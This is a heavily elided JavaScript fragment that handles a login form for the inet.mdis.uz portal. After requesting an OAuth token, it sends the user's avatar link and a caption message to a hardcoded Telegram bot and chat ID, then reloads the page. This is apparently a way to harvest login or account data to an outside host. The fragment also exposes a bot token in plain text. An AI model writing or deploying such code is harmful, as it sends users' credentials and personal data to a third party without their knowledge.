    ...
    if (!accessToken) {
        ...
        userReg.querySelector("#user-login").addEventListener("submit", e => {
            ...
            fetch('https://inet.mdis.uz/oauth/token', {
                ...
                fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendPhoto?chat_id=1273666675&photo=https://inet.mdis.uz${text.user.avatar}&has_spoiler=true&caption=${message}&parse_mode=html`).then(() => {
                    location.reload()
                })
            }).catch(() => {
                getUser()
